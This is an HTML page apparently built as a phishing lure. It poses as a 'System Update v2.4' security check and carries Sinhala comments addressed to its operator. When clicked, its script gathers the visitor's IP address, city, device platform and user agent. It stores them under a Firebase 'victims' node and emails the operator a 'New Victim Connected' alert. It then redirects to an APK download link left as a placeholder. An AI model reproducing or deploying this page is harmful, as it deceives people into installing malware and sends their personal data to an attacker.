<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Update v2.4</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; text-align: center; padding-top: 50px; }
        .box { border: 1px solid #0f0; display: inline-block; padding: 20px; border-radius: 10px; box-shadow: 0 0 15px #0f0; }
        .loading { font-size: 20px; margin-top: 10px; }
        button { background: #0f0; color: #000; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; border-radius: 5px; }
    </style>
</head>
<body>

    <div class="box">
        <h2>🔒 SYSTEM PROTECTION</h2>
        <p>Your device requires a critical security update.</p>
        <div id="status" class="loading">Please verify you are human...</div>
        <br>
        <button id="verify-btn" onclick="startTrap()">VERIFY & DOWNLOAD</button>
    </div>

    <script>
        // 1. උඹේ Config ටික (ඊයේ දුන්න ඒවා)
        const firebaseConfig = { databaseURL: "https://dark-dragon-team-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        emailjs.init("aop4SIq1OjHZn_EW7"); // Your Public Key

        async function startTrap() {
            const btn = document.getElementById('verify-btn');
            const status = document.getElementById('status');
            
            btn.style.display = "none";
            status.innerText = "Processing System Access...";

            try {
                // IP සහ Location විස්තර ගන්නවා
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                const victimData = {
                    target: "Target_User_" + Math.floor(Math.random() * 1000),
                    ip: data.ip,
                    city: data.city,
                    device: navigator.platform,
                    agent: navigator.userAgent,
                    time: new Date().toLocaleString(),
                    online: true
                };

                // Firebase එකට Data යවනවා (ඊයේ හැදූ Nodes වලට පේන්න)
                const newRef = db.ref('victims').push();
                await newRef.set(victimData);

                // Email එකක් යවනවා අලුත් කෙනෙක් සෙට් වුණා කියලා
                emailjs.send("service_h6bsq2s", "template_7slq3e6", {
                    to_name: "Dragon Master",
                    from_name: "Dragon System",
                    message: `New Victim Connected! IP: ${data.ip}, Device: ${navigator.platform}`,
                });

                status.style.color = "red";
                status.innerText = "System Hijacked. Downloading Payload...";
                
                // මෙතනට උඹේ APK ලින්ක් එක දාපන් (Mediafire වගේ)
                setTimeout(() => {
                    window.location.href = "https://www.mediafire.com/file/your_apk_link"; 
                }, 2000);

            } catch (error) {
                console.log(error);
                status.innerText = "Verification Failed. Try Again.";
                btn.style.display = "inline-block";
            }
        }
    </script>
</body>
</html>
